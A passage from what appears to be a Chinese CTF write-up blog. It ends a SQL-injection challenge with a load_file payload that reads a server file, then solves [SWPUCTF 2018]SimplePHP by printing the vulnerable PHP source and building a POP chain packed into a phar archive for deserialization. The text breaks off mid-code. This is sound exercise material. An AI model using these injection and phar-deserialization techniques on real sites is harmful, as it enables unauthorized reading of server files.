alt="image.png"><br>看到了flag文件<code>flag_8946e1ff1ee3e40f.php</code>，上面也说过DS_Store文件可以显示当前目录的所有文件清单，他在&#x2F;var&#x2F;www&#x2F;html删除了，所以flag的位置为<code>/var/www/html/flag_8946e1ff1ee3e40f.php</code><br>读取<br><code>&#39;,content=load_file(&#39;/var/www/html/flag_8946e1ff1ee3e40f.php&#39;),/*</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667621085993-dbcde5ae-4de2-4e3a-91ae-4c14590f49cf.png#averageHue=%23fdfcfc&clientId=u7ed31558-13a1-4&from=paste&height=152&id=u847c0aab&name=image.png&originHeight=190&originWidth=1053&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13601&status=done&style=none&taskId=ua646b95e-30c9-4d17-b1cf-a281767a3c2&title=&width=842.4" alt="image.png"><br>受益匪浅</p>
<h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><p>考点：phar反序列化，代码审计</p>
<p>查看文件处存在任意文件读取：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;base.php&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="title function_ invoke__">session_start</span>(); </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">&lt;!DOCTYPE html&gt; </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;head&gt; </span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt; </span><br><span class="line">    &lt;title&gt;web3&lt;/title&gt; </span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot;</span>&gt; </span><br><span class="line">    &lt;script src=<span class="string">&quot;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&quot;</span>&gt;&lt;/script&gt; </span><br><span class="line">    &lt;script src=<span class="string">&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">    &lt;nav <span class="class"><span class="keyword">class</span>=&quot;<span class="title">navbar</span> <span class="title">navbar</span>-<span class="title">default</span>&quot; <span class="title">role</span>=&quot;<span class="title">navigation</span>&quot;&gt; </span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>-<span class="title">fluid</span>&quot;&gt; </span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">navbar</span>-<span class="title">header</span>&quot;&gt; </span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">class</span>=&quot;<span class="title">navbar</span>-<span class="title">brand</span>&quot; <span class="title">href</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot;&gt;首页&lt;/<span class="title">a</span>&gt; </span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt; </span></span><br><span class="line"><span class="class">            &lt;<span class="title">ul</span> <span class="title">class</span>=&quot;<span class="title">nav</span> <span class="title">navbar</span>-<span class="title">nav</span> <span class="title">navbra</span>-<span class="title">toggle</span>&quot;&gt; </span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">active</span>&quot;&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">file</span>.<span class="title">php</span>?<span class="title">file</span>=&quot;&gt;查看文件&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt; </span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">upload_file</span>.<span class="title">php</span>&quot;&gt;上传文件&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt; </span></span><br><span class="line"><span class="class">            &lt;/<span class="title">ul</span>&gt; </span></span><br><span class="line"><span class="class">            &lt;<span class="title">ul</span> <span class="title">class</span>=&quot;<span class="title">nav</span> <span class="title">navbar</span>-<span class="title">nav</span> <span class="title">navbar</span>-<span class="title">right</span>&quot;&gt; </span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot;&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">glyphicon</span> <span class="title">glyphicon</span>-<span class="title">user</span>&quot;&gt;&lt;/<span class="title">span</span>&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">_SERVER</span>[&#x27;<span class="title">REMOTE_ADDR</span>&#x27;];?&gt;&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt; </span></span><br><span class="line"><span class="class">            &lt;/<span class="title">ul</span>&gt; </span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt; </span></span><br><span class="line"><span class="class">    &lt;/<span class="title">nav</span>&gt; </span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt; </span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt; </span></span><br><span class="line"><span class="class">&lt;!--<span class="title">flag</span> <span class="title">is</span> <span class="title">in</span> <span class="title">f1ag</span>.<span class="title">php</span>--&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//show_source(__FILE__); </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;base.php&quot;</span>; </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>].<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>; </span><br><span class="line">    <span class="comment">//mkdir(&quot;upload&quot;,0777); </span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>)) &#123; </span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">upload_file_check</span>()) &#123; </span><br><span class="line">        <span class="title function_ invoke__">upload_file_do</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$allowed_types</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>); </span><br><span class="line">    <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]); </span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$extension</span>)) &#123; </span><br><span class="line">        <span class="comment">//echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; </span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>,<span class="variable">$allowed_types</span>)) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;function.php&#x27;</span>; </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>; </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/var/www/html/&#x27;</span>); </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>] ? <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] : <span class="string">&quot;&quot;</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$file</span>)) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(); </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>)) &#123; </span><br><span class="line">    <span class="variable">$show</span>-&gt;source = <span class="variable">$file</span>; </span><br><span class="line">    <span class="variable">$show</span>-&gt;<span class="title function_ invoke__">_show</span>(); </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$file</span>))&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="variable language_">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;   <span class="comment">//$this-&gt;source = phar://phar.jpg</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file_get</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$value</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;function.php&#x27;</span>; </span><br><span class="line"><span class="title function_ invoke__">upload_file</span>(); </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta charest=<span class="string">&quot;utf-8&quot;</span>&gt; </span><br><span class="line">&lt;title&gt;文件上传&lt;/title&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;div align = <span class="string">&quot;center&quot;</span>&gt; </span><br><span class="line">        &lt;h1&gt;前端写得很low,请各位师傅见谅!&lt;/h1&gt; </span><br><span class="line">&lt;/div&gt; </span><br><span class="line">&lt;style&gt; </span><br><span class="line">    p&#123; margin:<span class="number">0</span> auto&#125; </span><br><span class="line">&lt;/style&gt; </span><br><span class="line">&lt;div&gt; </span><br><span class="line">&lt;form action=<span class="string">&quot;upload_file.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt; </span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;文件名:&lt;/label&gt; </span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span>&gt;&lt;br&gt; </span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt; </span><br><span class="line">&lt;/div&gt; </span><br><span class="line"></span><br><span class="line">&lt;/script&gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>仔细分析一波class.php很容易发现pop链<br><code>C1e4r::_destruct-&gt;Show::__tostring-&gt;Test::__get</code>，pop链如上，构造如下：<br>这边构造pop链需要注意一下，get魔术方法得到的是属性名source，而不是source对应的值，也就是param[‘source’]的值，在这一步由于有点忘记导致我搞混了，切记切记</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source;   <span class="comment">//$this-&gt;source = phar://phar.jpg</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;params[<span class="string">&#x27;source&#x27;</span>] =<span class="string">&#x27;/var/www/html/f1ag.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">C1e4r</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"> <span class="comment">/* 文件名 */</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title function_ invoke__">phar</span>(<span class="string">&quot;Boogipop.phar&quot;</span>); <span class="comment">//文件名</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="comment">/* 设置stub，必须要以__HALT_COMPILER(); ?&gt;结尾 */</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="comment">/* 设置自定义的metadata，序列化存储，解析时会被反序列化 */</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetaData</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="comment">/* 添加要压缩的文件 */</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test1.txt&quot;</span>,<span class="string">&quot;test1&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test2.txt&quot;</span>,<span class="string">&quot;test2&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span 